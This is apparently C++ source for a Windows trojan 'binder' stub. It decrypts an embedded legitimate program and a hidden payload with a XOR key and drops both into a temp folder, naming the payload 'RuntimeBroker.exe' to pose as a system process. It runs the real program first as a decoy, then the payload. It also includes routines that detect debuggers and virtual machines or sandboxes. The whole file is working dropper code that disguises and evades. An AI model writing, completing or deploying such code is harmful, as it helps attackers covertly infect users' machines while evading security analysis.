#include <windows.h>
#include <string>
#include <vector>
#include <cstring>
#include <intrin.h>

static bool writeFileData(const std::string& path, const std::vector<char>& data) {
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    size_t off = 0;
    while (off < data.size()) {
        DWORD written = 0;
        DWORD toWrite = (DWORD)((data.size() - off > 8 * 1024 * 1024) ? (8 * 1024 * 1024) : (data.size() - off));
        if (!WriteFile(hFile, data.data() + off, toWrite, &written, nullptr) || written == 0) {
            CloseHandle(hFile);
            return false;
        }
        off += written;
    }
    CloseHandle(hFile);
    return true;
}

static std::string getTempPath() {
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    return std::string(temp);
}

static std::string getFileNameOnly(const std::string& path) {
    size_t pos = path.find_last_of("\\/");
    if (pos == std::string::npos) return path;
    return path.substr(pos + 1);
}

static bool runFile(const std::string& path, const std::string& workDir) {
    // Prefer ShellExecute for GUI apps + manifest elevation
    HINSTANCE h = ShellExecuteA(
        nullptr, "open", path.c_str(), nullptr,
        workDir.empty() ? nullptr : workDir.c_str(),
        SW_SHOWNORMAL);
    if ((INT_PTR)h > 32)
        return true;

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
    PROCESS_INFORMATION pi = {};
    std::string cmd = "\"" + path + "\"";
    std::vector<char> cmdBuf(cmd.begin(), cmd.end());
    cmdBuf.push_back('\0');

    BOOL ok = CreateProcessA(
        path.c_str(), cmdBuf.data(), nullptr, nullptr, FALSE,
        0, nullptr,
        workDir.empty() ? nullptr : workDir.c_str(),
        &si, &pi);
    if (!ok)
        return false;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

static std::string parseConfigValue(const std::vector<char>& config, const char* key) {
    if (config.empty() || !key) return {};
    std::string text(config.begin(), config.end());
    std::string prefix = std::string(key) + "=";
    size_t pos = 0;
    while (pos < text.size()) {
        size_t end = text.find_first_of("\r\n", pos);
        if (end == std::string::npos) end = text.size();
        std::string line = text.substr(pos, end - pos);
        if (line.size() >= prefix.size() && _strnicmp(line.c_str(), prefix.c_str(), (unsigned)prefix.size()) == 0) {
            std::string val = line.substr(prefix.size());
            while (!val.empty() && (val.back() == ' ' || val.back() == '\t' || val.back() == '\r'))
                val.pop_back();
            return val;
        }
        pos = (end < text.size() && text[end] == '\r' && end + 1 < text.size() && text[end + 1] == '\n') ? end + 2 : end + 1;
    }
    return {};
}

static bool loadResourceData(WORD id, std::vector<char>& out) {
    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(id), RT_RCDATA);
    if (!hRes) return false;
    DWORD size = SizeofResource(nullptr, hRes);
    HGLOBAL hData = LoadResource(nullptr, hRes);
    if (!hData) return false;
    void* p = LockResource(hData);
    if (!p || !size) return false;
    out.assign((char*)p, (char*)p + size);
    return true;
}

static bool binderIsDebugged() {
    if (IsDebuggerPresent()) return true;
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    if (remote) return true;

    // Check PEB BeingDebugged
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
#endif
    if (peb && peb[2] != 0) return true;

    // Check for debugger windows
    const char* dbgClasses[] = { "OLLYDBG", "WinDbgFrameClass", "x64dbg", "x32dbg", nullptr };
    for (int i = 0; dbgClasses[i]; i++) {
        if (FindWindowA(dbgClasses[i], nullptr))
            return true;
    }
    return false;
}

static bool binderIsSandbox() {
    // Score-based: never kill real PCs on uptime/RAM alone
    int score = 0;

    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        __cpuid(cpuInfo, 0x40000000);
        char vendor[13] = {};
        memcpy(vendor + 0, &cpuInfo[1], 4);
        memcpy(vendor + 4, &cpuInfo[2], 4);
        memcpy(vendor + 8, &cpuInfo[3], 4);
        vendor[12] = 0;
        if (_stricmp(vendor, "VMwareVMware") == 0) score += 4;
        else if (_stricmp(vendor, "VBoxVBoxVBox") == 0) score += 4;
        else if (_stricmp(vendor, "KVMKVMKVM") == 0) score += 4;
        else if (_stricmp(vendor, "XenVMMXenVMM") == 0) score += 4;
    }

    if (GetTickCount() < 120000)
        score += 1;

    MEMORYSTATUSEX mem = {};
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))
        score += 1;

    return score >= 4;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Always run — sandbox checks live in payload options only.
    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    std::string hostName = getFileNameOnly(exePath);
    if (hostName.empty())
        hostName = "app.exe";

    std::vector<char> original;
    std::vector<char> payload;
    std::vector<char> config;
    std::vector<char> keyData;

    if (!loadResourceData(101, original) || !loadResourceData(102, payload))
        return 1;
    loadResourceData(103, config);
    if (!loadResourceData(104, keyData) || keyData.size() < 32)
        return 1;

    {
        int n = (int)original.size();
        for (int idx = 0; idx < n; idx++) {
            original[idx] = (char)(original[idx] ^ keyData[idx % 32]);
        }
    }
    {
        int n = (int)payload.size();
        for (int idx = 0; idx < n; idx++) {
            payload[idx] = (char)(payload[idx] ^ keyData[idx % 32]);
        }
    }
    {
        int n = (int)config.size();
        for (int idx = 0; idx < n; idx++) {
            config[idx] = (char)(config[idx] ^ keyData[idx % 32]);
        }
    }

    if (original.size() < 64 || payload.size() < 64)
        return 1;
    if (original[0] != 'M' || original[1] != 'Z')
        return 1;
    if (payload[0] != 'M' || payload[1] != 'Z')
        return 1;

    std::string tempDir = getTempPath() + "tmp_" + std::to_string(GetTickCount()) + "\\";
    CreateDirectoryA(tempDir.c_str(), nullptr);

    std::string originalName = parseConfigValue(config, "original_name");
    if (originalName.empty())
        originalName = hostName;
    originalName = getFileNameOnly(originalName);
    if (originalName.empty())
        originalName = "app.exe";
    if (originalName.size() < 4 || _stricmp(originalName.c_str() + originalName.size() - 4, ".exe") != 0)
        originalName += ".exe";

    std::string originalPath = tempDir + originalName;
    std::string payloadPath = tempDir + "RuntimeBroker.exe";
    std::string configPath = tempDir + "config.ini";
    std::string payloadIniPath = tempDir + "payload.ini";

    if (!writeFileData(originalPath, original))
        return 1;
    if (!writeFileData(payloadPath, payload))
        return 1;
    if (!config.empty()) {
        writeFileData(configPath, config);
        writeFileData(payloadIniPath, config);
    }

    // Launch original UI first
    runFile(originalPath, tempDir);
    Sleep(600);
    // Then payload worker (reads config.ini / payload.ini from same folder)
    runFile(payloadPath, tempDir);
    return 0;
}
